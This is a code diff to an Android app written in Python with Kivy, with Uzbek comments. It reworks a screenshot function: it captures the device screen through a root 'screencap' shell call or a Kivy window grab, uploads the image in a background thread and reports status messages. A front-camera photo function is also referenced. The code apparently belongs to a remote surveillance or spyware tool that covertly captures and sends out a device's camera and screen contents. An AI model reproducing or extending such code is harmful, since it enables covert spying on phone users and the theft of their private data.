@@ -215,7 +215,6 @@ def take_photo_kivy(front_camera):
         threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
 
-# ─── EKRAN RASMI (Screenshot) ──────────────────────────────────────────────────
 def take_screenshot_sync():
     try:
         from jnius import autoclass
@@ -223,30 +222,35 @@ def take_screenshot_sync():
         ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
         filepath = ext_dir + '/scr.png'
         
-        # 1-usul: Android shell orqali (ba'zi qurilmalarda ishlaydi)
+        # 1-usul: Android shell orqali (faqat Root qilingan telefonlarda ishlaydi)
         os.system(f'screencap -p {filepath}')
-        
         if os.path.exists(filepath) and os.path.getsize(filepath) > 1000:
             threading.Thread(
                 target=upload_file_sync, args=(filepath, 'photo'), daemon=True
             ).start()
-            return "Ekran rasmi (Shell) olindi, yuborilmoqda..."
+            return "Ekran rasmi (Shell/Root) olindi, yuborilmoqda..."
 
-        # 2-usul: Kivy oynasini rasmga olish (agar ilova ochiq bo'lsa)
-        from kivy.core.window import Window
-        Window.screenshot(name=filepath)
-        time.sleep(1.0)
-        
-        import glob
-        files = glob.glob(ext_dir + '/scr*.png')
-        if files:
-            latest_file = max(files, key=os.path.getctime)
-            threading.Thread(
-                target=upload_file_sync, args=(latest_file, 'photo'), daemon=True
-            ).start()
-            return "Ekran rasmi (Window) olindi, yuborilmoqda..."
+        # 2-usul: Kivy oynasini rasmga olish (Asosiy threadda chaqirilishi shart)
+        def _capture_kivy(dt):
+            from kivy.core.window import Window
+            import glob
+            # Kivy avtomatik ravishda nomiga raqam qo'shadi (masalan: scr_0001.png)
+            Window.screenshot(name=ext_dir + '/scr_')
             
-        return "Ekran rasmi olinmadi. (Android 11+ da tizim ruxsati talab qilinishi mumkin)"
+            def _upload_later(dt2):
+                files = glob.glob(ext_dir + '/scr_*.png')
+                if files:
+                    latest_file = max(files, key=os.path.getctime)
+                    threading.Thread(target=upload_file_sync, args=(latest_file, 'photo'), daemon=True).start()
+                    msg = "Ekran rasmi (Ilova oynasi) olindi, yuborilmoqda..."
+                else:
+                    msg = "Ekran rasmi (Ilova oynasi) saqlanmadi."
+                threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
+                
+            Clock.schedule_once(_upload_later, 2.0)
+
+        Clock.schedule_once(_capture_kivy, 0)
+        return "Ekran rasmi olinmoqda (faqat ilova oynasi)..."
     except Exception as e:
         return "Screenshot xatoligi: " + str(e)
 
